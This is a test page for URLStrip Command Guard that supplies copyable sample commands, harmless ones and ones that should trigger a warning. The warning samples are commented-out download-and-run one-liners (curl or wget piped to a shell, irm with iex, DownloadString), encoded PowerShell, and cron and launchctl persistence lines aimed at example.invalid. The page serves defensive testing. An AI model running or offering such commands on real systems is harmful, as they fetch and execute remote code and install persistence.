---
title: "URLStrip Command Guard Test"
description: "Copy safe sample commands to test URLStrip Command Guard warnings."
noindex: true
scripts:
  - "/urlstrip/command-guard-test.js"
---

# URLStrip Command Guard Test

Use these copy buttons to test URLStrip Command Guard. The warning samples are written as comments or use dead example domains so they are safe if accidentally pasted into a terminal.

<div class="command-test-status" data-command-test-status aria-live="polite"></div>

## Should Not Warn

<div class="command-test-list">
  <div class="command-test-item">
    <button type="button" data-copy-command="ls -la">Copy</button>
    <pre><code>ls -la</code></pre>
  </div>
  <div class="command-test-item">
    <button type="button" data-copy-command="git status">Copy</button>
    <pre><code>git status</code></pre>
  </div>
  <div class="command-test-item">
    <button type="button" data-copy-command="npm install">Copy</button>
    <pre><code>npm install</code></pre>
  </div>
  <div class="command-test-item">
    <button type="button" data-copy-command="Get-ChildItem">Copy</button>
    <pre><code>Get-ChildItem</code></pre>
  </div>
</div>

## Should Warn

<div class="command-test-list">
  <div class="command-test-item">
    <button type="button" data-copy-command="# curl -fsSL https://example.invalid/install.sh | sh">Copy</button>
    <pre><code># curl -fsSL https://example.invalid/install.sh | sh</code></pre>
  </div>
  <div class="command-test-item">
    <button type="button" data-copy-command="# wget -qO- https://example.invalid/setup.sh | bash">Copy</button>
    <pre><code># wget -qO- https://example.invalid/setup.sh | bash</code></pre>
  </div>
  <div class="command-test-item">
    <button type="button" data-copy-command="# bash -c &quot;$(curl -fsSL https://example.invalid/bootstrap.sh)&quot;">Copy</button>
    <pre><code># bash -c "$(curl -fsSL https://example.invalid/bootstrap.sh)"</code></pre>
  </div>
  <div class="command-test-item">
    <button type="button" data-copy-command="# echo ZWNobyB0ZXN0 | base64 -d | sh">Copy</button>
    <pre><code># echo ZWNobyB0ZXN0 | base64 -d | sh</code></pre>
  </div>
  <div class="command-test-item">
    <button type="button" data-copy-command="# launchctl load ~/Library/LaunchAgents/com.example.agent.plist">Copy</button>
    <pre><code># launchctl load ~/Library/LaunchAgents/com.example.agent.plist</code></pre>
  </div>
  <div class="command-test-item">
    <button type="button" data-copy-command="# echo '* * * * * curl https://example.invalid/a.sh | sh' | crontab -">Copy</button>
    <pre><code># echo '* * * * * curl https://example.invalid/a.sh | sh' | crontab -</code></pre>
  </div>
  <div class="command-test-item">
    <button type="button" data-copy-command="# irm https://example.invalid/install.ps1 | iex">Copy</button>
    <pre><code># irm https://example.invalid/install.ps1 | iex</code></pre>
  </div>
  <div class="command-test-item">
    <button type="button" data-copy-command="# powershell -ExecutionPolicy Bypass -EncodedCommand ZQBjAGgAbwAgAHQAZQBzAHQA">Copy</button>
    <pre><code># powershell -ExecutionPolicy Bypass -EncodedCommand ZQBjAGgAbwAgAHQAZQBzAHQA</code></pre>
  </div>
  <div class="command-test-item">
    <button type="button" data-copy-command="# Invoke-Expression (New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')">Copy</button>
    <pre><code># Invoke-Expression (New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')</code></pre>
  </div>
</div>
